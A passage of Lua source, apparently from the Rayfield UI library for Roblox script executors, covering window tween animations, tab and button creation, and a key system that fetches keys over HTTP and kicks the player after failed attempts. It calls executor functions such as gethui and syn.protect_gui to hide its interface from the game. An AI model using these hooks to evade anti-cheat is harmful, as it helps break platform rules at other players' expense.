					TweenService:Create(tabbtn, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {BackgroundTransparency = 0}):Play()
					TweenService:Create(tabbtn.Title, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {TextTransparency = 0}):Play()
					TweenService:Create(tabbtn.Shadow, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {ImageTransparency = 0.9}):Play()
					TweenService:Create(tabbtn.Image, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {ImageTransparency = 0}):Play()
					TweenService:Create(tabbtn.UIStroke, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {Transparency = 1}):Play()
				else
					TweenService:Create(tabbtn, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {BackgroundTransparency = 0.7}):Play()
					TweenService:Create(tabbtn.Image, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {ImageTransparency = 0.2}):Play()
					TweenService:Create(tabbtn.Shadow, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {ImageTransparency = 0.7}):Play()
					TweenService:Create(tabbtn.Title, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {TextTransparency = 0.2}):Play()
					TweenService:Create(tabbtn.UIStroke, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {Transparency = 0}):Play()
				end

			end
		end
		for _, tab in ipairs(Elements:GetChildren()) do
			if tab.Name ~= "Template" and tab.ClassName == "ScrollingFrame" and tab.Name ~= "Placeholder" then
				for _, element in ipairs(tab:GetChildren()) do
					if element.ClassName == "Frame" then
						if element.Name ~= "SectionSpacing" and element.Name ~= "Placeholder" then
							if element.Name == "SectionTitle" then
								TweenService:Create(element.Title, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {TextTransparency = 0}):Play()
							else
								TweenService:Create(element, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {BackgroundTransparency = 0}):Play()
								TweenService:Create(element.UIStroke, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {Transparency = 0}):Play()
								TweenService:Create(element.Title, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {TextTransparency = 0}):Play()
							end
							for _, child in ipairs(element:GetChildren()) do
								if child.ClassName == "Frame" or child.ClassName == "TextLabel" or child.ClassName == "TextBox" or child.ClassName == "ImageButton" or child.ClassName == "ImageLabel" then
									child.Visible = true
								end
							end
						end
					end
				end
			end
		end
		wait(0.5)
		Minimised = false
		Debounce = false
	end

	function Maximise()
		Debounce = true
		Topbar.ChangeSize.Image = "rbxassetid://"..10137941941


		TweenService:Create(Topbar.UIStroke, TweenInfo.new(0.5, Enum.EasingStyle.Quint), {Transparency = 1}):Play()
		TweenService:Create(Main.Shadow.Image, TweenInfo.new(0.5, Enum.EasingStyle.Quint), {ImageTransparency = 0.4}):Play()
		TweenService:Create(Topbar.CornerRepair, TweenInfo.new(0.5, Enum.EasingStyle.Quint), {BackgroundTransparency = 0}):Play()
		TweenService:Create(Topbar.Divider, TweenInfo.new(0.5, Enum.EasingStyle.Quint), {BackgroundTransparency = 0}):Play()
		TweenService:Create(Main, TweenInfo.new(0.5, Enum.EasingStyle.Quint), {Size = UDim2.new(0, 500, 0, 475)}):Play()
		TweenService:Create(Topbar, TweenInfo.new(0.5, Enum.EasingStyle.Quint), {Size = UDim2.new(0, 500, 0, 45)}):Play()
		TabList.Visible = true
		wait(0.2)

		Elements.Visible = true

		for _, tab in ipairs(Elements:GetChildren()) do
			if tab.Name ~= "Template" and tab.ClassName == "ScrollingFrame" and tab.Name ~= "Placeholder" then
				for _, element in ipairs(tab:GetChildren()) do
					if element.ClassName == "Frame" then
						if element.Name ~= "SectionSpacing" and element.Name ~= "Placeholder" then
							if element.Name == "SectionTitle" then
								TweenService:Create(element.Title, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {TextTransparency = 0}):Play()
							else
								TweenService:Create(element, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {BackgroundTransparency = 0}):Play()
								TweenService:Create(element.UIStroke, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {Transparency = 0}):Play()
								TweenService:Create(element.Title, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {TextTransparency = 0}):Play()
							end
							for _, child in ipairs(element:GetChildren()) do
								if child.ClassName == "Frame" or child.ClassName == "TextLabel" or child.ClassName == "TextBox" or child.ClassName == "ImageButton" or child.ClassName == "ImageLabel" then
									child.Visible = true
								end
							end
						end
					end
				end
			end
		end


		wait(0.1)

		for _, tabbtn in ipairs(TabList:GetChildren()) do
			if tabbtn.ClassName == "Frame" and tabbtn.Name ~= "Placeholder" then
				if tostring(Elements.UIPageLayout.CurrentPage) == tabbtn.Title.Text then
					TweenService:Create(tabbtn, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {BackgroundTransparency = 0}):Play()
					TweenService:Create(tabbtn.Image, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {ImageTransparency = 0}):Play()
					TweenService:Create(tabbtn.Title, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {TextTransparency = 0}):Play()
					TweenService:Create(tabbtn.UIStroke, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {Transparency = 1}):Play()
					TweenService:Create(tabbtn.Shadow, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {ImageTransparency = 0.9}):Play()
				else
					TweenService:Create(tabbtn, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {BackgroundTransparency = 0.7}):Play()
					TweenService:Create(tabbtn.Shadow, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {ImageTransparency = 0.7}):Play()
					TweenService:Create(tabbtn.Image, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {ImageTransparency = 0.2}):Play()
					TweenService:Create(tabbtn.Title, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {TextTransparency = 0.2}):Play()
					TweenService:Create(tabbtn.UIStroke, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {Transparency = 0}):Play()
				end

			end
		end


		wait(0.5)
		Debounce = false
	end

	function Minimise()
		Debounce = true
		Topbar.ChangeSize.Image = "rbxassetid://"..11036884234

		for _, tabbtn in ipairs(TabList:GetChildren()) do
			if tabbtn.ClassName == "Frame" and tabbtn.Name ~= "Placeholder" then
				TweenService:Create(tabbtn, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {BackgroundTransparency = 1}):Play()
				TweenService:Create(tabbtn.Image, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {ImageTransparency = 1}):Play()
				TweenService:Create(tabbtn.Title, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {TextTransparency = 1}):Play()
				TweenService:Create(tabbtn.Shadow, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {ImageTransparency = 1}):Play()
				TweenService:Create(tabbtn.UIStroke, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {Transparency = 1}):Play()
			end
		end

		for _, tab in ipairs(Elements:GetChildren()) do
			if tab.Name ~= "Template" and tab.ClassName == "ScrollingFrame" and tab.Name ~= "Placeholder" then
				for _, element in ipairs(tab:GetChildren()) do
					if element.ClassName == "Frame" then
						if element.Name ~= "SectionSpacing" and element.Name ~= "Placeholder" then
							if element.Name == "SectionTitle" then
								TweenService:Create(element.Title, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {TextTransparency = 1}):Play()
							else
								TweenService:Create(element, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {BackgroundTransparency = 1}):Play()
								TweenService:Create(element.UIStroke, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {Transparency = 1}):Play()
								TweenService:Create(element.Title, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {TextTransparency = 1}):Play()
							end
							for _, child in ipairs(element:GetChildren()) do
								if child.ClassName == "Frame" or child.ClassName == "TextLabel" or child.ClassName == "TextBox" or child.ClassName == "ImageButton" or child.ClassName == "ImageLabel" then
									child.Visible = false
								end
							end
						end
					end
				end
			end
		end

		TweenService:Create(Topbar.UIStroke, TweenInfo.new(0.5, Enum.EasingStyle.Quint), {Transparency = 0}):Play()
		TweenService:Create(Main.Shadow.Image, TweenInfo.new(0.5, Enum.EasingStyle.Quint), {ImageTransparency = 1}):Play()
		TweenService:Create(Topbar.CornerRepair, TweenInfo.new(0.5, Enum.EasingStyle.Quint), {BackgroundTransparency = 1}):Play()
		TweenService:Create(Topbar.Divider, TweenInfo.new(0.5, Enum.EasingStyle.Quint), {BackgroundTransparency = 1}):Play()
		TweenService:Create(Main, TweenInfo.new(0.5, Enum.EasingStyle.Quint), {Size = UDim2.new(0, 495, 0, 45)}):Play()
		TweenService:Create(Topbar, TweenInfo.new(0.5, Enum.EasingStyle.Quint), {Size = UDim2.new(0, 495, 0, 45)}):Play()

		wait(0.3)

		Elements.Visible = false
		TabList.Visible = false

		wait(0.2)
		Debounce = false
	end

	function RayfieldLibrary:CreateWindow(Settings)
		local Passthrough = false
		Topbar.Title.Text = Settings.Name
		Main.Size = UDim2.new(0, 450, 0, 260)
		Main.Visible = true
		Main.BackgroundTransparency = 1
		LoadingFrame.Title.TextTransparency = 1
		LoadingFrame.Subtitle.TextTransparency = 1
		Main.Shadow.Image.ImageTransparency = 1
		LoadingFrame.Version.TextTransparency = 1
		LoadingFrame.Title.Text = Settings.LoadingTitle or "Rayfield Interface Suite"
		LoadingFrame.Subtitle.Text = Settings.LoadingSubtitle or "by Sirius"
		if Settings.LoadingTitle ~= "Rayfield Interface Suite" then
			LoadingFrame.Version.Text = "Rayfield UI"
		end
		Topbar.Visible = false
		Elements.Visible = false
		LoadingFrame.Visible = true


		pcall(function()
			if not Settings.ConfigurationSaving.FileName then
				Settings.ConfigurationSaving.FileName = tostring(game.PlaceId)
			end
			if not isfolder(RayfieldFolder.."/".."Configuration Folders") then

			end
			if Settings.ConfigurationSaving.Enabled == nil then
				Settings.ConfigurationSaving.Enabled = false
			end
			CFileName = Settings.ConfigurationSaving.FileName
			ConfigurationFolder = Settings.ConfigurationSaving.FolderName or ConfigurationFolder
			CEnabled = Settings.ConfigurationSaving.Enabled

			if Settings.ConfigurationSaving.Enabled then
				if not isfolder(ConfigurationFolder) then
					makefolder(ConfigurationFolder)
				end	
			end
		end)

		AddDraggingFunctionality(Topbar,Main)

		for _, TabButton in ipairs(TabList:GetChildren()) do
			if TabButton.ClassName == "Frame" and TabButton.Name ~= "Placeholder" then
				TabButton.BackgroundTransparency = 1
				TabButton.Title.TextTransparency = 1
				TabButton.Shadow.ImageTransparency = 1
				TabButton.Image.ImageTransparency = 1
				TabButton.UIStroke.Transparency = 1
			end
		end



		if Settings.KeySystem then
			if not Settings.KeySettings then
				Passthrough = true
				return
			end

			if not isfolder(RayfieldFolder.."/Key System") then
				makefolder(RayfieldFolder.."/Key System")
			end

			if typeof(Settings.KeySettings.Key) == "string" then Settings.KeySettings.Key = {Settings.KeySettings.Key} end

			if Settings.KeySettings.GrabKeyFromSite then
				for i, Key in ipairs(Settings.KeySettings.Key) do
					local Success, Response = pcall(function()
						Settings.KeySettings.Key[i] = tostring(game:HttpGet(Key):gsub("[\n\r]", " "))
						Settings.KeySettings.Key[i] = string.gsub(Settings.KeySettings.Key[i], " ", "")
					end)
					if not Success then
						print("Rayfield | "..Key.." Error " ..tostring(Response))
					end
				end
			end

			if not Settings.KeySettings.FileName then
				Settings.KeySettings.FileName = "No file name specified"
			end

			if isfile(RayfieldFolder.."/Key System".."/"..Settings.KeySettings.FileName..ConfigurationExtension) then
				for _, MKey in ipairs(Settings.KeySettings.Key) do
					if string.find(readfile(RayfieldFolder.."/Key System".."/"..Settings.KeySettings.FileName..ConfigurationExtension), MKey) then
						Passthrough = true
					end
				end
			end

			if not Passthrough then
				local AttemptsRemaining = math.random(2,6)
				Rayfield.Enabled = false
				local KeyUI = game:GetObjects("rbxassetid://11380036235")[1]

				if gethui then
					KeyUI.Parent = gethui()
				elseif syn.protect_gui then
					syn.protect_gui(Rayfield)
					KeyUI.Parent = CoreGui
				else
					KeyUI.Parent = CoreGui
				end

				if gethui then
					for _, Interface in ipairs(gethui():GetChildren()) do
						if Interface.Name == KeyUI.Name and Interface ~= KeyUI then
							Interface.Enabled = false
							Interface.Name = "KeyUI-Old"
						end
					end
				else
					for _, Interface in ipairs(CoreGui:GetChildren()) do
						if Interface.Name == KeyUI.Name and Interface ~= KeyUI then
							Interface.Enabled = false
							Interface.Name = "KeyUI-Old"
						end
					end
				end

				local KeyMain = KeyUI.Main
				KeyMain.Title.Text = Settings.KeySettings.Title or Settings.Name
				KeyMain.Subtitle.Text = Settings.KeySettings.Subtitle or "Key System"
				KeyMain.NoteMessage.Text = Settings.KeySettings.Note or "No instructions"

				KeyMain.Size = UDim2.new(0, 467, 0, 175)
				KeyMain.BackgroundTransparency = 1
				KeyMain.Shadow.Image.ImageTransparency = 1
				KeyMain.Title.TextTransparency = 1
				KeyMain.Subtitle.TextTransparency = 1
				KeyMain.KeyNote.TextTransparency = 1
				KeyMain.Input.BackgroundTransparency = 1
				KeyMain.Input.UIStroke.Transparency = 1
				KeyMain.Input.InputBox.TextTransparency = 1
				KeyMain.NoteTitle.TextTransparency = 1
				KeyMain.NoteMessage.TextTransparency = 1
				KeyMain.Hide.ImageTransparency = 1

				TweenService:Create(KeyMain, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {BackgroundTransparency = 0}):Play()
				TweenService:Create(KeyMain, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {Size = UDim2.new(0, 500, 0, 187)}):Play()
				TweenService:Create(KeyMain.Shadow.Image, TweenInfo.new(0.5, Enum.EasingStyle.Quint), {ImageTransparency = 0.5}):Play()
				wait(0.05)
				TweenService:Create(KeyMain.Title, TweenInfo.new(0.4, Enum.EasingStyle.Quint), {TextTransparency = 0}):Play()
				TweenService:Create(KeyMain.Subtitle, TweenInfo.new(0.5, Enum.EasingStyle.Quint), {TextTransparency = 0}):Play()
				wait(0.05)
				TweenService:Create(KeyMain.KeyNote, TweenInfo.new(0.5, Enum.EasingStyle.Quint), {TextTransparency = 0}):Play()
				TweenService:Create(KeyMain.Input, TweenInfo.new(0.5, Enum.EasingStyle.Quint), {BackgroundTransparency = 0}):Play()
				TweenService:Create(KeyMain.Input.UIStroke, TweenInfo.new(0.5, Enum.EasingStyle.Quint), {Transparency = 0}):Play()
				TweenService:Create(KeyMain.Input.InputBox, TweenInfo.new(0.5, Enum.EasingStyle.Quint), {TextTransparency = 0}):Play()
				wait(0.05)
				TweenService:Create(KeyMain.NoteTitle, TweenInfo.new(0.4, Enum.EasingStyle.Quint), {TextTransparency = 0}):Play()
				TweenService:Create(KeyMain.NoteMessage, TweenInfo.new(0.4, Enum.EasingStyle.Quint), {TextTransparency = 0}):Play()
				wait(0.15)
				TweenService:Create(KeyMain.Hide, TweenInfo.new(0.4, Enum.EasingStyle.Quint), {ImageTransparency = 0.3}):Play()


				KeyUI.Main.Input.InputBox.FocusLost:Connect(function()
					if #KeyUI.Main.Input.InputBox.Text == 0 then return end
					local KeyFound = false
					local FoundKey = ''
					for _, MKey in ipairs(Settings.KeySettings.Key) do
						if string.find(KeyMain.Input.InputBox.Text, MKey) then
							KeyFound = true
							FoundKey = MKey
						end
					end
					if KeyFound then 
						TweenService:Create(KeyMain, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {BackgroundTransparency = 1}):Play()
						TweenService:Create(KeyMain, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {Size = UDim2.new(0, 467, 0, 175)}):Play()
						TweenService:Create(KeyMain.Shadow.Image, TweenInfo.new(0.5, Enum.EasingStyle.Quint), {ImageTransparency = 1}):Play()
						TweenService:Create(KeyMain.Title, TweenInfo.new(0.4, Enum.EasingStyle.Quint), {TextTransparency = 1}):Play()
						TweenService:Create(KeyMain.Subtitle, TweenInfo.new(0.5, Enum.EasingStyle.Quint), {TextTransparency = 1}):Play()
						TweenService:Create(KeyMain.KeyNote, TweenInfo.new(0.5, Enum.EasingStyle.Quint), {TextTransparency = 1}):Play()
						TweenService:Create(KeyMain.Input, TweenInfo.new(0.5, Enum.EasingStyle.Quint), {BackgroundTransparency = 1}):Play()
						TweenService:Create(KeyMain.Input.UIStroke, TweenInfo.new(0.5, Enum.EasingStyle.Quint), {Transparency = 1}):Play()
						TweenService:Create(KeyMain.Input.InputBox, TweenInfo.new(0.5, Enum.EasingStyle.Quint), {TextTransparency = 1}):Play()
						TweenService:Create(KeyMain.NoteTitle, TweenInfo.new(0.4, Enum.EasingStyle.Quint), {TextTransparency = 1}):Play()
						TweenService:Create(KeyMain.NoteMessage, TweenInfo.new(0.4, Enum.EasingStyle.Quint), {TextTransparency = 1}):Play()
						TweenService:Create(KeyMain.Hide, TweenInfo.new(0.4, Enum.EasingStyle.Quint), {ImageTransparency = 1}):Play()
						wait(0.51)
						Passthrough = true
						if Settings.KeySettings.SaveKey then
							if writefile then
								writefile(RayfieldFolder.."/Key System".."/"..Settings.KeySettings.FileName..ConfigurationExtension, FoundKey)
							end
							RayfieldLibrary:Notify({Title = "Key System", Content = "The key for this script has been saved successfully"})
						end
					else
						if AttemptsRemaining == 0 then
							TweenService:Create(KeyMain, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {BackgroundTransparency = 1}):Play()
							TweenService:Create(KeyMain, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {Size = UDim2.new(0, 467, 0, 175)}):Play()
							TweenService:Create(KeyMain.Shadow.Image, TweenInfo.new(0.5, Enum.EasingStyle.Quint), {ImageTransparency = 1}):Play()
							TweenService:Create(KeyMain.Title, TweenInfo.new(0.4, Enum.EasingStyle.Quint), {TextTransparency = 1}):Play()
							TweenService:Create(KeyMain.Subtitle, TweenInfo.new(0.5, Enum.EasingStyle.Quint), {TextTransparency = 1}):Play()
							TweenService:Create(KeyMain.KeyNote, TweenInfo.new(0.5, Enum.EasingStyle.Quint), {TextTransparency = 1}):Play()
							TweenService:Create(KeyMain.Input, TweenInfo.new(0.5, Enum.EasingStyle.Quint), {BackgroundTransparency = 1}):Play()
							TweenService:Create(KeyMain.Input.UIStroke, TweenInfo.new(0.5, Enum.EasingStyle.Quint), {Transparency = 1}):Play()
							TweenService:Create(KeyMain.Input.InputBox, TweenInfo.new(0.5, Enum.EasingStyle.Quint), {TextTransparency = 1}):Play()
							TweenService:Create(KeyMain.NoteTitle, TweenInfo.new(0.4, Enum.EasingStyle.Quint), {TextTransparency = 1}):Play()
							TweenService:Create(KeyMain.NoteMessage, TweenInfo.new(0.4, Enum.EasingStyle.Quint), {TextTransparency = 1}):Play()
							TweenService:Create(KeyMain.Hide, TweenInfo.new(0.4, Enum.EasingStyle.Quint), {ImageTransparency = 1}):Play()
							wait(0.45)
							game.Players.LocalPlayer:Kick("No Attempts Remaining")
							game:Shutdown()
						end
						KeyMain.Input.InputBox.Text = ""
						AttemptsRemaining = AttemptsRemaining - 1
						TweenService:Create(KeyMain, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {Size = UDim2.new(0, 467, 0, 175)}):Play()
						TweenService:Create(KeyMain, TweenInfo.new(0.4, Enum.EasingStyle.Elastic), {Position = UDim2.new(0.495,0,0.5,0)}):Play()
						wait(0.1)
						TweenService:Create(KeyMain, TweenInfo.new(0.4, Enum.EasingStyle.Elastic), {Position = UDim2.new(0.505,0,0.5,0)}):Play()
						wait(0.1)
						TweenService:Create(KeyMain, TweenInfo.new(0.4, Enum.EasingStyle.Quint), {Position = UDim2.new(0.5,0,0.5,0)}):Play()
						TweenService:Create(KeyMain, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {Size = UDim2.new(0, 500, 0, 187)}):Play()
					end
				end)

				KeyMain.Hide.MouseButton1Click:Connect(function()
					TweenService:Create(KeyMain, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {BackgroundTransparency = 1}):Play()
					TweenService:Create(KeyMain, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {Size = UDim2.new(0, 467, 0, 175)}):Play()
					TweenService:Create(KeyMain.Shadow.Image, TweenInfo.new(0.5, Enum.EasingStyle.Quint), {ImageTransparency = 1}):Play()
					TweenService:Create(KeyMain.Title, TweenInfo.new(0.4, Enum.EasingStyle.Quint), {TextTransparency = 1}):Play()
					TweenService:Create(KeyMain.Subtitle, TweenInfo.new(0.5, Enum.EasingStyle.Quint), {TextTransparency = 1}):Play()
					TweenService:Create(KeyMain.KeyNote, TweenInfo.new(0.5, Enum.EasingStyle.Quint), {TextTransparency = 1}):Play()
					TweenService:Create(KeyMain.Input, TweenInfo.new(0.5, Enum.EasingStyle.Quint), {BackgroundTransparency = 1}):Play()
					TweenService:Create(KeyMain.Input.UIStroke, TweenInfo.new(0.5, Enum.EasingStyle.Quint), {Transparency = 1}):Play()
					TweenService:Create(KeyMain.Input.InputBox, TweenInfo.new(0.5, Enum.EasingStyle.Quint), {TextTransparency = 1}):Play()
					TweenService:Create(KeyMain.NoteTitle, TweenInfo.new(0.4, Enum.EasingStyle.Quint), {TextTransparency = 1}):Play()
					TweenService:Create(KeyMain.NoteMessage, TweenInfo.new(0.4, Enum.EasingStyle.Quint), {TextTransparency = 1}):Play()
					TweenService:Create(KeyMain.Hide, TweenInfo.new(0.4, Enum.EasingStyle.Quint), {ImageTransparency = 1}):Play()
					wait(0.51)
					RayfieldLibrary:Destroy()
					KeyUI:Destroy()
				end)
			else
				Passthrough = true
			end
		end
		if Settings.KeySystem then
			repeat wait() until Passthrough
		end

		Notifications.Template.Visible = false
		Notifications.Visible = true
		Rayfield.Enabled = true
		wait(0.5)
		TweenService:Create(Main, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {BackgroundTransparency = 0}):Play()
		TweenService:Create(Main.Shadow.Image, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {ImageTransparency = 0.55}):Play()
		wait(0.1)
		TweenService:Create(LoadingFrame.Title, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {TextTransparency = 0}):Play()
		wait(0.05)
		TweenService:Create(LoadingFrame.Subtitle, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {TextTransparency = 0}):Play()
		wait(0.05)
		TweenService:Create(LoadingFrame.Version, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {TextTransparency = 0}):Play()

		Elements.Template.LayoutOrder = 100000
		Elements.Template.Visible = false

		Elements.UIPageLayout.FillDirection = Enum.FillDirection.Horizontal
		TabList.Template.Visible = false

		-- Tab
		local FirstTab = false
		local Window = {}
		function Window:CreateTab(Name,Image)
			local SDone = false
			local TabButton = TabList.Template:Clone()
			TabButton.Name = Name
			TabButton.Title.Text = Name
			TabButton.Parent = TabList
			TabButton.Title.TextWrapped = false
			TabButton.Size = UDim2.new(0, TabButton.Title.TextBounds.X + 30, 0, 30)

			if Image then
				TabButton.Title.AnchorPoint = Vector2.new(0, 0.5)
				TabButton.Title.Position = UDim2.new(0, 37, 0.5, 0)
				TabButton.Image.Image = "rbxassetid://"..Image
				TabButton.Image.Visible = true
				TabButton.Title.TextXAlignment = Enum.TextXAlignment.Left
				TabButton.Size = UDim2.new(0, TabButton.Title.TextBounds.X + 46, 0, 30)
			end

			TabButton.BackgroundTransparency = 1
			TabButton.Title.TextTransparency = 1
			TabButton.Shadow.ImageTransparency = 1
			TabButton.Image.ImageTransparency = 1
			TabButton.UIStroke.Transparency = 1

			TabButton.Visible = true

			-- Create Elements Page
			local TabPage = Elements.Template:Clone()
			TabPage.Name = Name
			TabPage.Visible = true

			TabPage.LayoutOrder = #Elements:GetChildren()

			for _, TemplateElement in ipairs(TabPage:GetChildren()) do
				if TemplateElement.ClassName == "Frame" and TemplateElement.Name ~= "Placeholder" then
					TemplateElement:Destroy()
				end
			end

			TabPage.Parent = Elements
			if not FirstTab then
				Elements.UIPageLayout.Animated = false
				Elements.UIPageLayout:JumpTo(TabPage)
				Elements.UIPageLayout.Animated = true
			end

			if SelectedTheme ~= RayfieldLibrary.Theme.Default then
				TabButton.Shadow.Visible = false
			end
			TabButton.UIStroke.Color = SelectedTheme.TabStroke
			-- Animate
			wait(0.1)
			if FirstTab then
				TabButton.BackgroundColor3 = SelectedTheme.TabBackground
				TabButton.Image.ImageColor3 = SelectedTheme.TabTextColor
				TabButton.Title.TextColor3 = SelectedTheme.TabTextColor
				TweenService:Create(TabButton, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {BackgroundTransparency = 0.7}):Play()
				TweenService:Create(TabButton.Title, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {TextTransparency = 0.2}):Play()
				TweenService:Create(TabButton.Image, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {ImageTransparency = 0.2}):Play()
				TweenService:Create(TabButton.UIStroke, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {Transparency = 0}):Play()

				TweenService:Create(TabButton.Shadow, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {ImageTransparency = 0.7}):Play()
			else
				FirstTab = Name
				TabButton.BackgroundColor3 = SelectedTheme.TabBackgroundSelected
				TabButton.Image.ImageColor3 = SelectedTheme.SelectedTabTextColor
				TabButton.Title.TextColor3 = SelectedTheme.SelectedTabTextColor
				TweenService:Create(TabButton.Shadow, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {ImageTransparency = 0.9}):Play()
				TweenService:Create(TabButton.Image, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {ImageTransparency = 0}):Play()
				TweenService:Create(TabButton, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {BackgroundTransparency = 0}):Play()
				TweenService:Create(TabButton.Title, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {TextTransparency = 0}):Play()
			end


			TabButton.Interact.MouseButton1Click:Connect(function()
				if Minimised then return end
				TweenService:Create(TabButton, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {BackgroundTransparency = 0}):Play()
				TweenService:Create(TabButton.UIStroke, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {Transparency = 1}):Play()
				TweenService:Create(TabButton.Title, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {TextTransparency = 0}):Play()
				TweenService:Create(TabButton.Image, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {ImageTransparency = 0}):Play()
				TweenService:Create(TabButton, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {BackgroundColor3 = SelectedTheme.TabBackgroundSelected}):Play()
				TweenService:Create(TabButton.Title, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {TextColor3 = SelectedTheme.SelectedTabTextColor}):Play()
				TweenService:Create(TabButton.Image, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {ImageColor3 = SelectedTheme.SelectedTabTextColor}):Play()
				TweenService:Create(TabButton.Shadow, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {ImageTransparency = 0.9}):Play()

				for _, OtherTabButton in ipairs(TabList:GetChildren()) do
					if OtherTabButton.Name ~= "Template" and OtherTabButton.ClassName == "Frame" and OtherTabButton ~= TabButton and OtherTabButton.Name ~= "Placeholder" then
						TweenService:Create(OtherTabButton, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {BackgroundColor3 = SelectedTheme.TabBackground}):Play()
						TweenService:Create(OtherTabButton.Title, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {TextColor3 = SelectedTheme.TabTextColor}):Play()
						TweenService:Create(OtherTabButton.Image, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {ImageColor3 = SelectedTheme.TabTextColor}):Play()
						TweenService:Create(OtherTabButton, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {BackgroundTransparency = 0.7}):Play()
						TweenService:Create(OtherTabButton.Title, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {TextTransparency = 0.2}):Play()
						TweenService:Create(OtherTabButton.Image, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {ImageTransparency = 0.2}):Play()
						TweenService:Create(OtherTabButton.Shadow, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {ImageTransparency = 0.7}):Play()
						TweenService:Create(OtherTabButton.UIStroke, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {Transparency = 0}):Play()
					end
				end
				if Elements.UIPageLayout.CurrentPage ~= TabPage then
					TweenService:Create(Elements, TweenInfo.new(1, Enum.EasingStyle.Quint), {Size = UDim2.new(0, 460,0, 330)}):Play()
					Elements.UIPageLayout:JumpTo(TabPage)
					wait(0.2)
					TweenService:Create(Elements, TweenInfo.new(0.8, Enum.EasingStyle.Quint), {Size = UDim2.new(0, 475,0, 366)}):Play()
				end

			end)

			local Tab = {}

			-- Button
			function Tab:CreateButton(ButtonSettings)
				local ButtonValue = {}

				local Button = Elements.Template.Button:Clone()
				Button.Name = ButtonSettings.Name
				Button.Title.Text = ButtonSettings.Name
				Button.Visible = true
				Button.Parent = TabPage

				Button.BackgroundTransparency = 1
				Button.UIStroke.Transparency = 1
				Button.Title.TextTransparency = 1

				TweenService:Create(Button, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {BackgroundTransparency = 0}):Play()
				TweenService:Create(Button.UIStroke, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {Transparency = 0}):Play()
				TweenService:Create(Button.Title, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {TextTransparency = 0}):Play()	


				Button.Interact.MouseButton1Click:Connect(function()
					local Success, Response = pcall(ButtonSettings.Callback)
					if not Success then
						TweenService:Create(Button, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {BackgroundColor3 = Color3.fromRGB(85, 0, 0)}):Play()
						TweenService:Create(Button.ElementIndicator, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {TextTransparency = 1}):Play()
						TweenService:Create(Button.UIStroke, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {Transparency = 1}):Play()
						Button.Title.Text = "Callback Error"
